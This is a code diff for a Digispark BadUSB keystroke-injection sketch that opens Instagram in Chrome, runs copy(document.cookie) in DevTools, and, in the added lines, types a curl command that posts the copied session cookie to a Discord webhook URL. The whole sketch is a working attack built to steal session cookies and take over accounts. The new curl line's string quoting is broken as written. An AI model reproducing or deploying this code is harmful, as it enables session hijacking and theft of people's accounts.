@@ -6,14 +6,14 @@ void setup() {
     // Open Chrome (Win + R -> chrome -> Enter)
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(500);
-    DigiKeyboard.print("chrome");
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(2000);
+    DigiKeyboard.print("chrome instagram.com");
+    //DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    //DigiKeyboard.delay(2000);
 
     // Open Instagram
-    DigiKeyboard.print("instagram.com");
+    //DigiKeyboard.print("instagram.com");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(3000);
+    DigiKeyboard.delay(4000);
 
     // Open DevTools (F12)
     DigiKeyboard.sendKeyStroke(KEY_F12);
@@ -26,6 +26,13 @@ void setup() {
     // Run JavaScript to copy session cookie
     DigiKeyboard.print(F("copy(document.cookie);"));
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+    // Sending session cookie to webhooks
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+    DigiKeyboard.delay(500);
+    DigiKeyboard.print("curl -X POST -H "Content-Type: application/json" -d "{\"content\":\""
+    DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);
+    DigiKeyboard.print("\"}" "https://discord.com/api/webhooks/1341299046094209105/cUFsKop8wOufYDkV3zQyeAhmDAjHaNZDlWqjxUSmAasbA0Jgyukd2KZ2rLCvSYeeHFxu""
 }
 
 void loop() {
